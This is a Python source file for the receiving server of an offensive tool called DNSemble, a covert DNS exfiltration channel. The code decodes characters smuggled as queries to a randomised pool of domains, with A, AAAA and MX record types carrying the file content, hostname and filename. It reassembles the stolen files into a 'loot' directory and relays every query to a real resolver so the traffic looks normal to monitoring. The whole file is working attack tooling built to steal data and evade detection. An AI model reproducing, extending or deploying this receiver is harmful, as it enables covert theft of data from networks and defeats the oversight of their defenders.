#!/usr/bin/env python3
"""
DNSemble Server — DNS Exfiltration Receiver

Listens for DNS queries, decodes the hidden data channel, and
forwards every query to a real upstream resolver so the client
gets legitimate answers and the traffic looks completely normal.
"""

import socket
import os
import time
import random

from core import domains as domains_mod
from core.domains import (
    CONTROL_DOMAIN,
    QTYPE_A, QTYPE_AAAA, QTYPE_MX,
    CTRL_SESSION_START, CTRL_END_HOSTNAME, CTRL_END_FILENAME,
    CTRL_END_CONTENT, CTRL_CHUNK_OFFSET,
    decode_txid, parse_dns_query,
    build_dns_response, build_servfail,
    generate_permutation, build_domain_to_char, seed_to_ip,
)
from core.functions import C, BANNER, banner_kwargs, log


class Session:
    def __init__(self, client_id, source_ip, seed):
        self.client_id     = client_id
        self.source_ip     = source_ip
        self.seed          = seed
        self.start_time    = time.time()
        self.phase         = "HOSTNAME"
        self.hostname_buf  = {}
        self.filename_buf  = {}
        self.content_buf   = {}
        self.content_chunk = 0
        self.hostname      = ""
        self.filename      = ""
        self.content       = ""

        perm = generate_permutation(seed)
        self.domain_to_char = build_domain_to_char(perm)

    def assemble(self, buf):
        if not buf:
            return ""
        return "".join(buf[k] for k in sorted(buf.keys()))

    def content_pos(self, seq):
        return self.content_chunk * 256 + seq


class DNSembleServer:
    def __init__(self, port, upstream, loot_dir):
        self.port      = port
        self.upstream  = upstream
        self.loot_dir  = loot_dir
        self.sessions  = {}
        self.completed = 0
        self.total_q   = 0
        os.makedirs(loot_dir, exist_ok=True)

    def start(self, skip_banner=False):
        if not skip_banner:
            print(BANNER.format(**banner_kwargs()))
        print(f"  {C.bold}Listen addr{C.rst}    0.0.0.0:{self.port}")
        print(f"  {C.bold}Upstream DNS{C.rst}   {self.upstream}:53")
        print(f"  {C.bold}Loot dir{C.rst}       {self.loot_dir}/")
        print(f"  {C.bold}Ctrl domain{C.rst}    {CONTROL_DOMAIN}")
        print(f"  {C.bold}Domain pool{C.rst}    {len(domains_mod.DOMAINS)} domains  (mapping randomised per session)")
        print(f"\n{'━' * 60}\n")
        log("READY", C.grn, "Waiting for exfiltration sessions …")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", self.port))

        try:
            while True:
                data, addr = sock.recvfrom(4096)
                self.total_q += 1
                self._handle(sock, data, addr)
        except KeyboardInterrupt:
            self._final_stats()
        finally:
            sock.close()

    def _handle(self, sock, data, addr):
        parsed = parse_dns_query(data)
        if parsed is None:
            self._forward(sock, data, addr)
            return

        txid, qname, qtype = parsed
        cid, seq = decode_txid(txid)

        if qname == CONTROL_DOMAIN:
            self._on_control(sock, data, cid, seq, addr)
            return

        if qname in domains_mod.DOMAIN_TO_INDEX:
            self._on_data(cid, seq, qname, qtype, addr)

        self._forward(sock, data, addr)

    def _on_control(self, sock, raw, cid, seq, addr):

        if seq == CTRL_SESSION_START:
            seed = random.randint(1, 0xFFFFFFFF)
            s = Session(cid, addr[0], seed)
            self.sessions[cid] = s

            ip_str = seed_to_ip(seed)
            resp = build_dns_response(raw, ip_str)
            sock.sendto(resp, addr)

            log(" INIT", C.grn,
                f"Client {C.bold}#{cid}{C.rst} from {C.cyn}{addr[0]}{C.rst}"
                f"  seed=0x{seed:08X}  →  mapping generated")
            log("STATS", C.dim,
                f"Active: {len(self.sessions)}  |  Completed: {self.completed}")
            return

        s = self.sessions.get(cid)

        if seq == CTRL_END_HOSTNAME and s:
            s.hostname = s.assemble(s.hostname_buf)
            s.phase = "FILENAME"
            log(" HOST", C.cyn,
                f"Client #{cid} | hostname complete: "
                f"{C.bold}\"{s.hostname}\"{C.rst}  "
                f"({len(s.hostname_buf)} queries)")

        elif seq == CTRL_END_FILENAME and s:
            s.filename = s.assemble(s.filename_buf)
            s.phase = "CONTENT"
            log(" FILE", C.mag,
                f"Client #{cid} | filename complete: "
                f"{C.bold}\"{s.filename}\"{C.rst}  "
                f"({len(s.filename_buf)} queries)")

        elif seq == CTRL_END_CONTENT and s:
            s.content = s.assemble(s.content_buf)
            s.phase = "COMPLETE"
            self._complete(s)

        elif seq >= CTRL_CHUNK_OFFSET + 1 and s:
            chunk = seq - CTRL_CHUNK_OFFSET
            s.content_chunk = chunk
            log("CHUNK", C.ylw,
                f"Client #{cid} | content chunk #{chunk}")

        self._forward(sock, raw, addr)

    def _on_data(self, cid, seq, domain, qtype, addr):
        s = self.sessions.get(cid)
        if s is None:
            return

        char = s.domain_to_char.get(domain)
        if char is None:
            return

        display = repr(char) if char in ("\n", "\t", "\r") else char

        if qtype == QTYPE_AAAA:
            s.hostname_buf[seq] = char
            partial = s.assemble(s.hostname_buf)
            log(" HOST", C.cyn,
                f"Client #{cid} | "
                f"{C.bold}\"{partial}\"{C.rst}  ← {domain} (AAAA)")

        elif qtype == QTYPE_MX:
            s.filename_buf[seq] = char
            partial = s.assemble(s.filename_buf)
            log(" FILE", C.mag,
                f"Client #{cid} | "
                f"{C.bold}\"{partial}\"{C.rst}  ← {domain} (MX)")

        elif qtype == QTYPE_A:
            pos = s.content_pos(seq)
            s.content_buf[pos] = char
            n = len(s.content_buf)
            log(" DATA", C.ylw,
                f"Client #{cid} | pos {pos:>4d} "
                f"'{display}' ← {domain} (A)  [{n} chars]")

    def _complete(self, s):
        self.completed += 1
        dur = time.time() - s.start_time
        nq = len(s.hostname_buf) + len(s.filename_buf) + len(s.content_buf) + 4

        safe = lambda t: "".join(
            c if c.isalnum() or c in "-_." else "_" for c in t)
        loot_name = f"{safe(s.hostname)}_{safe(s.filename)}"
        loot_path = os.path.join(self.loot_dir, loot_name)

        with open(loot_path, "w") as f:
            f.write(s.content)

        bar = f"{C.grn}{'═' * 60}{C.rst}"
        sep = f"{C.grn}{'─' * 60}{C.rst}"
        print(f"\n{bar}")
        print(f"  {C.bold}{C.grn}EXFILTRATION COMPLETE{C.rst}")
        print(bar)
        print(f"  {C.bold}Client ID{C.rst}   #{s.client_id}")
        print(f"  {C.bold}Source IP{C.rst}   {s.source_ip}")
        print(f"  {C.bold}Hostname{C.rst}    {s.hostname}")
        print(f"  {C.bold}Filename{C.rst}    {s.filename}")
        print(f"  {C.bold}Size{C.rst}        {len(s.content)} bytes")
        print(f"  {C.bold}Duration{C.rst}    {dur:.1f}s")
        print(f"  {C.bold}DNS queries{C.rst} {nq}")
        print(f"  {C.bold}Seed{C.rst}        0x{s.seed:08X}")
        print(sep)
        print(f"  {C.bold}Content:{C.rst}")
        for line in s.content.split("\n"):
            print(f"  {C.ylw}{line}{C.rst}")
        print(sep)
        print(f"  {C.bold}Saved to{C.rst}    {loot_path}")
        print(bar)

        active = len(self.sessions) - 1
        log("STATS", C.dim,
            f"Active: {active}  |  Completed: {self.completed}  |  "
            f"Queries: {self.total_q}")
        print()

        del self.sessions[s.client_id]

    def _forward(self, sock, data, addr):
        try:
            up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            up.settimeout(2.0)
            up.sendto(data, (self.upstream, 53))
            resp, _ = up.recvfrom(4096)
            up.close()
            sock.sendto(resp, addr)
        except Exception:
            try:
                sock.sendto(build_servfail(data), addr)
            except Exception:
                pass

    def _final_stats(self):
        print(f"\n{C.cyn}{'═' * 60}{C.rst}")
        print(f"  {C.bold}DNSemble shutting down{C.rst}")
        print(f"  Total queries processed : {self.total_q}")
        print(f"  Sessions completed      : {self.completed}")
        print(f"  Sessions still active   : {len(self.sessions)}")
        for cid, s in self.sessions.items():
            print(f"    └─ Client #{cid} from {s.source_ip} "
                  f"(phase: {s.phase}, "
                  f"content so far: {len(s.content_buf)} chars)")
        print(f"{C.cyn}{'═' * 60}{C.rst}")
